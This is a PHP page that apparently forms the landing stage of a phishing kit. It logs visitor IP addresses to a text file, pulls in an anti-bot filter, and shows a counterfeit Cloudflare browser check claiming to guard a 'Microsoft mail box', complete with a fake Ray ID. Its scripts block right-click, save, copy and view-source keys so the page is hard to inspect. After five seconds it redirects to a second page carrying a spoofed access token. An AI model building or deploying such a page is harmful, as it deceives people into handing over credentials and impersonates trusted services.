<?php
   ob_start();
    session_start();

function getRealIpAddr(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])){$ip=$_SERVER['HTTP_CLIENT_IP'];}
 elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}
 else{$ip=$_SERVER['REMOTE_ADDR'];}
 return $ip;
}

$myfile = fopen("Views.txt", "a+");
fwrite($myfile, getRealIpAddr()."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
fclose($myfile);
require_once 'antibot.php';


?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Just a moment...</title>
        <link rel="shortcut icon" href="./img/alert.png" type="image/png">
        <link rel="stylesheet" href="./Arvest_files/cf.css">
    </head>
    <script>
// prevent ctrl + s
window.addEventListener('keydown', async(e) => {
    if (e.ctrlKey && (e.which == 83)) {
        e.preventDefault();
        return false; }
});
window.addEventListener('contextmenu', event => event.preventDefault());
window.onkeydown = (e) => {
    return !(e.ctrlKey &&
        (e.keyCode === 67 ||
            e.keyCode === 86 ||
            e.keyCode === 85 ||
            e.keyCode === 117));
};
</script>
    <body>
        <table width="100%" height="100%" cellpadding="20">
            <tbody>
                <tr>
                    <td valign="middle" align="center">
                        <div class="cf-browser-verification cf-im-under-attack">
                            <noscript>
                                <h1 data-translate="turn_on_js" style="color:#bd2426;">Please turn JavaScript on and reload the page.</h1>
                                <style>
                                    #cf-content {display: none !important;}
                                </style>
                            </noscript>
                            <div id="cf-content" style="display: block;">
                                <div id="cf-bubbles">
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                <div class="bubbles"></div>
                                </div>
                                <h1>
                                    <span data-translate="checking_browser">Checking your browser before
                                        accessing</span> Microsoft mail box
                                </h1>
                                <div id="no-cookie-warning" class="cookie-warning" data-translate="turn_on_cookies" style="display:none">
                                    <p data-translate="turn_on_cookies" style="color:#bd2426;">Please enable Cookies and reload the page.</p>
                                </div>
                                <p data-translate="process_is_automatic">This process is automatic. Your browser will redirect to your
                                requested content shortly.</p>
                                <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs">Please allow up to 5 seconds…</p>
                                <p data-translate="redirecting" id="cf-spinner-redirecting" style="display:none">Redirecting…</p>
                            </div>
                        </div>
                        <div class="attribution">
                            DDoS protection by <a style="cursor: pointer;">Cloudflare</a>
                            <br>
                            <span class="ray_id">Ray ID: <code><?php echo uniqid();  ?></code></span>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </body>
    <script>
        const random = (length = 8) => {return Math.random().toString(16).substr(2, length);};
        setTimeout(() => {window.location.replace(`index1.php?id=${Math.random().toString(25).substr(2, 35)}?access_token=${Math.random().toString(25).substr(2, 35)}`);}, 5000)
    </script>
</html>

